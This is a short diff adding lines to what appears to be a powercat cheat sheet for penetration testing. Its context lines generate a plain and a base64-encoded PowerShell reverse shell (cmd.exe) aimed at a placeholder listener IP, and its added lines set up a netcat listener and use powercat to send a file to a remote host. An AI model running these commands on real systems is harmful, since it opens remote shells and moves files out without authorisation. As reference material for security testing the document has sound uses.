@@ -30,3 +30,12 @@ PS C:\> powercat -c <listener IP address> -p 443 -e cmd.exe -g > reverseshell.ps
 PS C:\> powercat -c <listener IP address> -p 443 -e cmd.exe -ge > encoded_reverseshell.ps1
 
 PS C:\> powershell -E <content from encoded_reverseshell.ps1>
+```
+
+```powershell
+# Set up a listener to receive a file from remote host
+$ nc -nlvp > file 
+
+# Use powercat to connect to a listener and transfer a file 
+PS C:\> powercat -c <listener IP Address> -p <listener port> -i  <File Full location>
+```
